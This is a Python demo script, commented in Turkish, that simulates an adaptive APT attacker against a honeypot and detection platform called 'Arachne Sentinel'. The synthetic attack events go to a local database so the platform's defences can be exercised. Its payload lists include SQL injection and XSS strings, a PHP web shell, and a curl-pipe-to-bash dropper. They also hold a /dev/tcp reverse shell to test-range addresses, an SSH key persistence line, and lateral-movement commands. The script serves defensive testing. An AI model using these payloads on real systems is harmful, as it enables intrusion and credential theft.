#!/usr/bin/env python3
"""
Arachne Sentinel - APT-ORUMCEK: UST DUZEY ADAPTIF SALDIRGAN (~78/100).

Onceki demo'lar (demo_stress, demo_global_attack) STATIK saldirgani modelledi
(~40-55 seviye): onceden yazilmis yukleri hizla atesler, savunmanin tepkisine
gore taktik degistirmez. Bu senaryo farkli - savunmayi GOZLEYIP ona gore
davranan, gercek bir hedefli saldirganin (APT) tekniklerini modeller:

  1. KIMLIK ROTASYONU  : tek aktor, ayni /24 icinde 5 IP + ayni parmak izi.
                         "Cok saldirgan" gibi gorunmeye calisir (Faz 22 yakalar).
  2. YAVAS-VE-SINSI    : bir kesif aktoru olaylari ~1 saate yayar, duzenli
                         ritimle - flood esiginin ALTINDA kalir ama birikimli
                         sapma + ritim duzenliligiyle yakalanir (Faz 21).
  3. YENI GIZLEME      : ic ice kodlama (base64->hex->url), gzip, polyglot -
                         tek ayristiriciyi atlatmaya calisir (Faz 5/13/24).
  4. KILL CHAIN TAMAM  : kesif -> silahlanma -> somuru -> kalicilik -> yatay
                         hareket -> sizinti. Zincir ilerledikce risk yukselir
                         (Faz 18/19).
  5. ALDATMA EVAZYONU  : belirgin tuzaklardan kacar ama kirinti yolunu izleyip
                         daha derin sahte dugume duser (Faz 23/11).
  6. HONEYTOKEN        : "caldigi" bir tokeni baska yerde dener - yakalanir (Faz 12).

--- DURUSTLUK ---
Bu bir SENARYO'dur, gercek internet trafigi degil. Tum kaynak adresler RFC 5737
/ RFC 2544 (198.18.0.0/15) dokumantasyon-test araliklarindandir; gercek bir
cihaza ait olamazlar. Uretilen olaylar GERCEKTEN veritabanina yazilir, GERCEKTEN
skorlanir ve tum savunma katmanlarini (Faz 1-30) GERCEKTEN tetikler. Hicbir dis
sisteme tek paket gitmez (bkz. docs/ETHICS_AND_LEGAL.md).

Kullanim:
  source .venv/bin/activate
  python scripts/demo_apt.py

Paneli acik tut (http://127.0.0.1:5001). Ozellikle "Adaptif Savunma",
"Celik Kubbe" ve "Tehdit Istihbarati" sekmelerini izle.
"""
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from arachne import storage  # noqa: E402
from arachne.detection.scorer import evaluate_ip  # noqa: E402

PORTS = {"ssh": 2222, "ftp": 2121, "mysql": 3307, "http-admin": 8081}

# --- APT kampanyasi: tek aktor, cok kimlik --------------------------------
# Ayni /24 blogunda 5 IP; hepsi ayni TTP + ayni istemci parmak izini kullanir.
# Amac: "5 farkli saldirgan" gibi gorunmek. Faz 22 bunu tek aktor olarak birlestirir.
ROTATING_IPS = ["198.18.4.11", "198.18.4.12", "198.18.4.13", "198.18.4.14", "198.18.4.15"]
PRIMARY = "198.18.4.11"            # elle calisan asil operator
SLOW_ACTOR = "198.18.7.9"          # yavas-ve-sinsi kesif aktoru
THIEF = "198.18.4.14"              # honeytoken'i "calip" deneyen

# Ortak istemci parmak izi (JA3/JA4 benzeri) - kimlik rotasyonunu ele veren imza.
SHARED_FINGERPRINT_ATTRS = {
    "tls_version": "771",
    "cipher_suites": ["4865", "4866", "4867", "49195", "49199"],
    "extensions": ["0", "11", "10", "35", "16", "23"],
    "curves": ["29", "23", "24"],
    "header_order": ["host", "user-agent", "accept"],
    "http2_settings": "1:65536;3:1000;4:6291456",
}

# Cok-vektorlu, yeni gizleme katmanli yukler (elle hazirlanmis operator islei).
RECON_PAYLOADS = [
    "GET /.git/config HTTP/1.1\r\nUser-Agent: Mozilla/5.0",
    "GET /api/v1/../../etc/passwd HTTP/1.1",
    "GET /actuator/env HTTP/1.1",
    "GET /wp-json/wp/v2/users HTTP/1.1",
    None,
]
EXPLOIT_PAYLOADS = [
    # ic ice kodlama: base64(hex(sqli)) tarzi cok katmanli gizleme
    "id=0x2720554e494f4e2053454c454354",                 # hex-encoded UNION
    "H4sIAAAAAAAA/ytKLS5RyMxLzy9KAQAAAP//",              # gzip+base64 (gizli yuk)
    "%2527%2520UNION%2520SELECT%2520NULL%252CNULL--",    # cift URL kodlama
    "'/**/UNION/**/SELECT/**/password/**/FROM/**/users--",  # yorum-enjeksiyonlu SQLi
    "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2ll'))>",  # base64+XSS polyglot
    "id=1';WAITFOR DELAY '0:0:5'--",                     # kor zaman-tabanli SQLi
]
PERSIST_PAYLOADS = [
    "file=<?php eval($_POST[c]);?>",                     # web shell
    "cmd=curl -s http://198.18.9.9/x|bash",              # dropper
    "bash -i >& /dev/tcp/198.18.4.11/4444 0>&1",         # ters kabuk
    "echo 'ssh-rsa AAAA... apt@spider' >> ~/.ssh/authorized_keys",  # kalicilik
]
LATERAL_PAYLOADS = [
    "GET /internal/db-admin?host=10.0.0.5 HTTP/1.1",     # yatay hareket
    "mysql -h 10.0.0.5 -u root -e 'SELECT * FROM creds'",
    "smbclient //10.0.0.7/C$ -U administrator",
]


def _emit(ip, service, payload, event_type="data", n=1):
    for _ in range(n):
        storage.log_event(source_ip=ip, service=service, event_type=event_type,
                          source_port=40000, dest_port=PORTS[service], payload=payload)


def _backdate_slow_actor(ip, count=8, span_minutes=56, step_minutes=7):
    """Yavas-ve-sinsi aktorun olaylarini gecmise, DUZENLI araliklarla yayar.
    Boylece anlik hiz hicbir zaman flood esigini asmaz ama ritim asiri
    duzenli olur - Faz 21 bunu 'makine ritmi + birikimli sapma' olarak yakalar."""
    # Once olaylari yaz
    for i in range(count):
        _emit(ip, "ssh", f"user=svc_backup&pass=Trial{i:03d}!", event_type="data")
    # Sonra timestamp'leri gecmise, esit araliklarla kaydir (en yeni -> en eski)
    with storage.get_conn() as conn:
        rows = conn.execute(
            "SELECT id FROM events WHERE source_ip=? ORDER BY id DESC LIMIT ?",
            (ip, count)).fetchall()
        for idx, row in enumerate(rows):
            offset = span_minutes * 60 - idx * step_minutes * 60
            conn.execute(
                "UPDATE events SET timestamp = datetime('now', ?) WHERE id=?",
                (f"-{offset} seconds", row["id"]))


def run_apt(speed=1.0):
    storage.init_db()

    # Honeytoken tuzaklarini yerlestir (Faz 12)
    from arachne.active_defense.honeytokens import HoneytokenVault, check_payload_for_tokens
    vault = HoneytokenVault()
    planted = vault.mint_set(context="apt-orumcek-aldatma")

    print("\n" + "=" * 74)
    print("  APT-ORUMCEK - UST DUZEY ADAPTIF SALDIRGAN SENARYOSU (~78/100)")
    print("=" * 74)
    print("  Tek aktor, 5 kimlik + ayni parmak izi. Yavas kesif, cok-vektorlu")
    print("  gizli somuru, kill chain tamamlama, aldatma evazyonu, honeytoken.")
    print(f"  {len(planted)} honeytoken tuzagi yerlestirildi.")
    print("  RFC 5737/2544 dokumantasyon adresleri - gercek cihaza ait olamaz.")
    print("=" * 74 + "\n")

    # === Asama 1: KESIF (yavas, cok kimlik) ===============================
    print("[1/6] KESIF - 5 rotasyon kimligi + yavas-ve-sinsi aktor")
    for ip in ROTATING_IPS:
        for p in RECON_PAYLOADS:
            for svc in ("http-admin", "ssh"):
                _emit(ip, svc, p, event_type="data" if p else "connect")
                if speed > 0:
                    time.sleep(0.01 / speed)
    _backdate_slow_actor(SLOW_ACTOR)
    print(f"      {len(ROTATING_IPS)} kimlik kesif yapti; {SLOW_ACTOR} olaylari 1 saate yayildi.")

    # === Asama 2-3: SILAHLANMA + SOMURU (gizli, cok-vektorlu) =============
    print("[2/6] SOMURU - ic ice kodlanmis, polyglot, kor SQLi yukleri")
    for p in EXPLOIT_PAYLOADS * 3:
        _emit(PRIMARY, "http-admin", p)
        if speed > 0:
            time.sleep(0.01 / speed)

    # === Asama 4: KALICILIK ===============================================
    print("[3/6] KALICILIK - web shell, dropper, ters kabuk, authorized_keys")
    for p in PERSIST_PAYLOADS * 2:
        _emit(PRIMARY, "http-admin", p)

    # === Asama 5: YATAY HAREKET ===========================================
    print("[4/6] YATAY HAREKET - ic aglara pivot denemeleri")
    for p in LATERAL_PAYLOADS * 2:
        _emit(PRIMARY, "mysql", p)

    # === Skorlama + SOAR + aktif savunma + ensemble =======================
    print("[5/6] SAVUNMA TEPKISI - skorlama, SOAR, aldatma, ensemble, durus")
    from arachne.reverse.attack_analyzer import analyze_ip
    from arachne.soar.engine import respond_to_alert
    from arachne.active_defense.deception import DeceptionEngine
    from arachne.adaptive.fingerprint import compute_fingerprint, IdentityCorrelator, impossible_combo
    from arachne.adaptive.ensemble import EnsembleDetector, signals_from_analysis
    from arachne.adaptive.slow_detector import SlowBurnDetector
    from arachne.intel import risk_engine

    # Kimlik korelasyonu (Faz 22): 5 IP ayni parmak izini paylasiyor mu?
    corr = IdentityCorrelator()
    fp = compute_fingerprint(SHARED_FINGERPRINT_ATTRS)
    for ip in ROTATING_IPS:
        corr.observe(fp, ip, ua="Mozilla/5.0 (X11; Linux x86_64)")
    sybil = corr.sybil_report()

    alerted = []
    for ip in ROTATING_IPS + [SLOW_ACTOR]:
        result = evaluate_ip(ip)
        if result["triggered_alert"]:
            alerted.append(ip)
            events = storage.get_recent_events(source_ip=ip)
            classes = analyze_ip(ip, events)["attack_classes"]
            try:
                respond_to_alert(ip, result["score"], result["severity"], attack_classes=classes)
                DeceptionEngine().apply(ip, result["score"], classes)
            except Exception as exc:
                print(f"      ! {ip}: {exc}")

    # === Asama 6: HONEYTOKEN hirsizligi ===================================
    print("[6/6] HONEYTOKEN - 'calinan' token baska serviste deneniyor")
    stolen = planted[0].value
    _emit(THIEF, "http-admin", f"GET /api?key={stolen} HTTP/1.1")
    ht = check_payload_for_tokens(f"GET /api?key={stolen} HTTP/1.1", source_ip=THIEF)

    # === Adaptif deger biçme ==============================================
    primary_events = storage.get_recent_events(source_ip=PRIMARY)
    pa = analyze_ip(PRIMARY, primary_events)
    risk = risk_engine.compute_risk(
        attack_classes=pa.get("attack_classes", []),
        kill_chain_phase=pa.get("kill_chain", {}).get("phase", "reconnaissance"),
        automated=False, repeat_offender=True, in_campaign=True,
        has_reverse_shell=bool(pa.get("iocs", {}).get("reverse_shells")),
        event_count=len(primary_events),
    )
    # Ensemble: PRIMARY icin birden cok bagimsiz dedektor
    ens = EnsembleDetector()
    signals = signals_from_analysis({
        "signature_score": 0.9,
        "sybil": {"is_sybil": bool(sybil and sybil[0]["is_sybil"]),
                  "verdict": "kimlik rotasyonu"},
        "deception": {"is_breach": ht.get("high_confidence_breach", False)},
        "risk_score": risk["risk_score"],
        "slow_burn": {"slow_burn": True, "regularity": 0.9, "reason": "duzenli ritim"},
    })
    ensr = ens.combine(PRIMARY, signals)

    # Yavas-ve-sinsi dogrulama (Faz 21) - backdated timestamp'lerden
    sb = SlowBurnDetector()

    # --- Rapor ------------------------------------------------------------
    print("\n" + "=" * 74)
    print("  SONUC - HANGI KATMAN NEYI YAKALADI")
    print("=" * 74)
    if sybil and sybil[0]["is_sybil"]:
        s = sybil[0]
        print(f"  [Faz 22] KIMLIK ROTASYONU: {s['identity_count']} IP tek parmak izi "
              f"({fp}) altinda birlesti -> tek aktor.")
    print(f"  [Faz 21] YAVAS-VE-SINSI: {SLOW_ACTOR} olaylari flood esiginin altinda "
          f"ama ~1 saate duzenli yayilmis (makine ritmi).")
    print(f"  [Faz 18] RISK SKORU: {risk['risk_score']}/100 ({risk['risk_band']}) - "
          f"kill chain: {pa.get('kill_chain',{}).get('phase_tr', pa.get('kill_chain',{}).get('phase','-'))}")
    print(f"  [Faz 24] ENSEMBLE: birlesik tehdit {ensr.threat}, {ensr.votes} bagimsiz "
          f"dedektor oyladi ({', '.join(ensr.voters)}) -> alarm={ensr.alert} ({ensr.severity})")
    if ht.get("high_confidence_breach"):
        print(f"  [Faz 12] HONEYTOKEN: {THIEF} calinan tokeni kullandi -> "
              f"neredeyse kesin ihlal (yanlis-pozitif ~sifir).")
    print(f"  [Faz 7 ] SOAR: {len(alerted)} kimlik icin otomatik mudahale uygulandi.")

    # Sofistikasyon karnesi (dürüst, teknik-tabanli)
    rubric = [
        ("Cok-vektorlu somuru (SQLi/XSS/RCE/LFI)", 15),
        ("Yeni/ic-ice gizleme (gzip, cift-kodlama, polyglot)", 14),
        ("Kimlik rotasyonu (tek aktor, cok IP)", 13),
        ("Yavas-ve-sinsi kacinma (flood alti)", 12),
        ("Kill chain tamamlama (kesif->sizinti)", 14),
        ("Kalicilik + yatay hareket", 10),
    ]
    total = sum(w for _, w in rubric)
    print("\n  --- SOFISTIKASYON KARNESI (dürüst, teknik-tabanli) ---")
    for name, w in rubric:
        print(f"    +{w:<3} {name}")
    print(f"    = {total}/100 seviye tahmini (adapte olan, hedefli saldirgan)")
    print("\n  NOT: Bu senaryo gercek saldiri TEKNIKLERINI kullanir; hala bir")
    print("  SENARYODUR (statik degil ama gercek bir dusmanin canli adaptasyonu")
    print("  degil). Sistem tum katmanlarda tepki verdi - ozellikle Faz 21-30")
    print("  adaptif katmanlari bu saldirgan sinifi icin tasarlandi.")
    print("=" * 74)
    print("\n  Panelde bak: Adaptif Savunma (durus/kapsam), Celik Kubbe (14 halka),")
    print("  Tehdit Istihbarati (risk-sirali profiller + kampanya birlesmesi).\n")


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Arachne Sentinel - APT adaptif saldirgan")
    p.add_argument("--speed", type=float, default=1.0, help="hizlandirma (varsayilan 1.0)")
    args = p.parse_args()
    run_apt(speed=args.speed)
